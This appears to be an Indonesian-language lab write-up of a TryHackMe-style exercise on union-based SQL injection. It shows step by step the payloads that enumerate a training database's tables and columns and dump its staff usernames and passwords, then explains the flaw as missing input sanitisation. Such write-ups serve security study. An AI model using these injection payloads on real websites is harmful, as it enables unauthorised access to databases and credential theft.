\# SQL Injection - Data Extraction



\## 🎯 Tujuan

Memahami cara mengambil data dari database menggunakan SQL Injection (UNION SELECT)



---



\## 1. Identifikasi Injection Point



URL:

https://website.thm/article?id=1



Payload:

?id=1'



Hasil:

\- Muncul error → input tidak difilter



Kesimpulan:

Parameter `id` rentan terhadap SQL Injection



📸 Screenshot:

!\[Error](image/data-extraction/sqli-error.png)



---



\## 2. Test UNION SELECT



Payload:

?id=-1 UNION SELECT 1,2,3--



Hasil:

\- Angka 2 muncul di atas

\- Angka 3 muncul di bawah



Kesimpulan:

\- Kolom ke-2 dan ke-3 ditampilkan ke halaman

\- Kolom ke-1 tidak terlihat



Catatan:

Menggunakan `-1` agar query asli tidak mengembalikan data,

sehingga hasil dari UNION lebih terlihat jelas



📸 Screenshot:

!\[Union](image/data-extraction/sqli-union.png)



---



\## 3. Mengambil Nama Database



Payload:

?id=-1 UNION SELECT 1,database(),3--



Hasil:

sqli\_one



Kesimpulan:

Nama database berhasil didapat menggunakan function `database()`



📸 Screenshot:

!\[Database](image/data-extraction/sqli-database.png)



---



\## 4. Enumerasi Tabel



Payload:

?id=-1 UNION SELECT 1,group\_concat(table\_name),3 

FROM information\_schema.tables 

WHERE table\_schema='sqli\_one'--



Hasil:

article,staff\_users



Kesimpulan:

\- Database memiliki beberapa tabel

\- Tabel target yang menarik adalah `staff\_users`



📸 Screenshot:

!\[Tables](image/data-extraction/sqli-tables.png)



---



\## 5. Enumerasi Kolom



Payload:

?id=-1 UNION SELECT 1,group\_concat(column\_name),3 

FROM information\_schema.columns 

WHERE table\_name='staff\_users'--



Hasil:

id,username,password



Kesimpulan:

Struktur tabel `staff\_users` berhasil diketahui



📸 Screenshot:

!\[Columns](image/data-extraction/sqli-columns.png)



---



\## 6. Dump Data User



Payload:

0 UNION SELECT 1,2,group\_concat(username,':',password SEPARATOR '<br>') FROM staff\_users



Hasil:

\- admin:p4ssword

\- martin:pa$$word

\- jim:work123



Kesimpulan:

\- Berhasil mengambil data sensitif (username \& password)

\- Menggunakan `group\_concat` untuk menampilkan semua data sekaligus dalam satu output



📸 Screenshot:

!\[Dump](image/data-extraction/sqli-dump.png)



---



\## 🧠 Analisis Cara Kerja SQL Injection



Query asli kemungkinan:



SELECT \* FROM article WHERE id = '1';



Saat input dimasukkan:



?id=1'



Query menjadi:



SELECT \* FROM article WHERE id = '1'';



→ terjadi error karena tanda kutip tidak seimbang



Saat menggunakan UNION:



?id=-1 UNION SELECT 1,2,3--



Query menjadi:



SELECT \* FROM article WHERE id = '-1'

UNION

SELECT 1,2,3;



→ query dari attacker digabung dengan query asli



Kesimpulan:

\- Aplikasi tidak melakukan sanitasi input

\- User input langsung dimasukkan ke query SQL

\- Hal ini memungkinkan attacker untuk memodifikasi query dan mengambil data dari database



---



\## 🧠 Kesimpulan Akhir



\- SQL Injection memungkinkan akses langsung ke database

\- UNION SELECT digunakan untuk menampilkan data buatan attacker

\- information\_schema digunakan untuk mengetahui struktur database

\- Data sensitif seperti username dan password dapat diekstrak

\- Kurangnya validasi input menjadi penyebab utama kerentanan

